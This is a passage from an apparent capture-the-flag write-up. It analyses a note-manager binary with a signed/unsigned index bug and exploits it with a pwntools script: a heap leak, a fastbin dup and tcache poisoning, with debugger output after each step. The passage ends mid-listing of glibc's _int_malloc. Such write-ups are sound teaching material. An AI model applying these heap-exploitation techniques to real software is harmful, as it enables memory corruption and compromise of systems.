<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">destroy_1705</span><span class="p">(</span><span class="n">chunk_struct</span> <span class="o">*</span><span class="n">main_arr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter the index of the note to destroy: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">check_destroy_13D1</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">main_arr</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v3</span> <span class="o">-</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">check_destroy_13D1</span><span class="p">(</span><span class="n">chunk_struct</span> <span class="o">*</span><span class="n">main_arr</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">||</span> <span class="o">!</span><span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Note index out of range.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">main_arr</span><span class="o">-&gt;</span><span class="n">chunks</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that <code>destroy</code> function will try to <code>free</code> the larger chunk (which contains our input payload), then nullify the <code>chunks[idx]</code> array to 0. This seems okay, but this function has the main vulnerability that can be abused later. The bug is very subtle, but observe that if you send a <code>negative</code> value, in the <code>destroy</code> function, the <code>idx</code> will be treated as <code>signed</code>, but in the <code>check_destroy</code>, it will be treated as <code>unsigned</code>.</p>
<p>This bug means that if we try to destroy an item with negative index, our larger chunk will still get destroyed by the <code>check_destroy</code> function, but the <code>chunks[idx]</code> that is being nullified is the <code>signed</code> value version, which means that the <code>chnks[unsigned(idx)]</code> won&rsquo;t be nullified, leading to Use-After-Free and Double Free.</p>
<p>Now that we know the vulnerability, we need to think what&rsquo;s the strategy here to exploit this binary.</p>
<h3 id="solution">Solution</h3>
<p>First, with the UAF bug, we can easily leak the heap address of the <code>chunks</code>, because after the chunks getting freed with negative index, we can still view the content of it, which now contains mangled pointer to the next freed chunk.</p>
<p>Second, observe that we basically can only allocate chunk with size <code>0x70</code>. This means that if we fulfill the <code>tcache[0x70]</code>, the next freed chunks will go to <code>fastbin</code>. With the Double Free vulnerability that we can trigger as well, we can do <code>fastbin dup</code> <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.36/fastbin_dup.c" target="_blank" rel="noopener noreffer ">attack</a>, by doing a sequence of:</p>
<ul>
<li><code>free(a)</code></li>
<li><code>free(b)</code></li>
<li><code>free(a)</code></li>
</ul>
<p>The above sequence will cause the fastbin linked list will be like <code>a -&gt; b -&gt; a</code>, and this can be abused later.</p>
<h4 id="stage-1-leak-heap--trigger-fastbin-dup">Stage 1: Leak heap &amp; trigger fastbin dup</h4>
<p>First, let&rsquo;s start by creating our helper to make our life easier.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;migrain_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ld = ELF(&#34;./ld-2.37.so&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># remote_url = &#34;137.184.6.25&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">17001</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># gdb.attach(r, gdbscript=gdbscript)</span>
</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">demangle</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">is_heap_base</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_heap_base</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xfff</span> <span class="o">&lt;&lt;</span> <span class="mi">52</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">mask</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">v</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">            <span class="n">val</span> <span class="o">^=</span> <span class="p">(</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">mask</span> <span class="o">&gt;&gt;=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mangle</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Max size = 0x64, chunk_size = 0x70</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Payload: &#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Index: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Data: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">destroy</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;destroy: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">neg</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">x</span><span class="o">-</span><span class="mi">256</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our first target is we want to get a heap leak and doing tcache poisoning. Let&rsquo;s start by allocating a lot of chunks first, so that we can use negative index to trigger UAF and Double-Free later.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">200</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After allocating a lot of chunks, let&rsquo;s try to fulfill the tcache.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Fulfill tcache</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">destroy</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s check in the gdb to ensure that <code>tcache[0x70]</code> is full.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; bins
</span></span><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x70 [  7]: 0x5613ef239620  0x5613ef239590  0x5613ef239500  0x5613ef239470  0x5613ef2393e0  0x5613ef239350  0x5613ef2392c0  0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Because <code>tcache[0x70]</code> is now full, every time we free a new chunk, it will go to <code>fastbin</code>. Now, we can try to trigger <code>fastbin dup</code> like what I explained before. We will need to use negative index to trigger the double-free and UAF (to leak the heap address).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">198</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">197</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">198</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="mi">198</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="n">demangle</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s check in the <code>gdb</code> to see the current <code>fastbin</code> state.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; bins
</span></span><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x70 [  7]: 0x5613ef239620  0x5613ef239590  0x5613ef239500  0x5613ef239470  0x5613ef2393e0  0x5613ef239350  0x5613ef2392c0  0x0
</span></span><span class="line"><span class="cl">fastbins
</span></span><span class="line"><span class="cl">0x20: 0x0
</span></span><span class="line"><span class="cl">0x30: 0x0
</span></span><span class="line"><span class="cl">0x40: 0x0
</span></span><span class="line"><span class="cl">0x50: 0x0
</span></span><span class="line"><span class="cl">0x60: 0x0
</span></span><span class="line"><span class="cl">0x70: 0x5613ef240210  0x5613ef240180  0x5613ef240210
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, we successfully trigger it. We also get a heap leak from it. Now, the next stage is we need to leak libc address.</p>
<h4 id="stage-2-leak-libc-address">Stage 2: Leak LIBC address</h4>
<p>Before trying to get a libc leak, you might be wondering why do we need to do the <code>fastbin dup</code>, what&rsquo;s the purpose of it? To see what we can do with it, let&rsquo;s try to empty the <code>tcache</code> first, because before we can use the freed chunk stored in the <code>fastbin</code>, <code>tcache</code> will be prioritized first by the glibc allocator.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">-</span><span class="mh">0x6e80</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Empty tcache</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">fake_chunk</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span>
</span></span><span class="line"><span class="cl">    <span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I will explain about the <code>fake_chunk</code> later, but for now, let&rsquo;s focus on what happen after we emptied the <code>tcache</code>. After we emptied the <code>tcache</code>, let&rsquo;s check the <code>bins</code> state first.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; bins
</span></span><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">empty
</span></span><span class="line"><span class="cl">fastbins
</span></span><span class="line"><span class="cl">0x20: 0x0
</span></span><span class="line"><span class="cl">0x30: 0x0
</span></span><span class="line"><span class="cl">0x40: 0x0
</span></span><span class="line"><span class="cl">0x50: 0x0
</span></span><span class="line"><span class="cl">0x60: 0x0
</span></span><span class="line"><span class="cl">0x70: 0x5613ef240210  0x5613ef240180  0x5613ef240210
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, what will happen if we try to allocate a new chunk with this <code>fastbins</code> state? Let say that we try to allocate a new chunk where the value is the mangled pointer of any address in the <code>heap</code>. In this case, I set the value of the new chunk to the <code>leaked_heap-0x6e80</code>, which is <code>0x5613ef239300</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; bins
</span></span><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x70 [  3]: 0x5613ef240190  0x5613ef240220  0x5613ef239300  0x0
</span></span><span class="line"><span class="cl">fastbins
</span></span><span class="line"><span class="cl">0x20: 0x0
</span></span><span class="line"><span class="cl">0x30: 0x0
</span></span><span class="line"><span class="cl">0x40: 0x0
</span></span><span class="line"><span class="cl">0x50: 0x0
</span></span><span class="line"><span class="cl">0x60: 0x0
</span></span><span class="line"><span class="cl">0x70: 0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, the <code>tcache[0x70]</code> now contains 3 items, where the last item is the address that we input before during allocating a new chunk. So what happened here is that if you look in this libc <code>_int_malloc</code> <a href="https://elixir.bootlin.com/glibc/glibc-2.37.9000/source/malloc/malloc.c#L3755" target="_blank" rel="noopener noreffer ">code</a>, there is a logic where during allocating a new chunk, it will try to iterate the fastbin and move it to the <code>tcache</code>.</p>
<p>Now, you might wonder why the <code>tcache[0x70]</code> contains 3 items instead of 2, because if you remember before, the <code>fastbins</code> have 3 items, and we allocate 1 chunk, so it should be 2. The reason is because of the <code>fastbin dup</code> that we trigger caused it. Here I will explained what happened in details.</p>
<p>Let&rsquo;s start by checking through the <code>_int_malloc</code> below code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="nf">_int_malloc</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span>
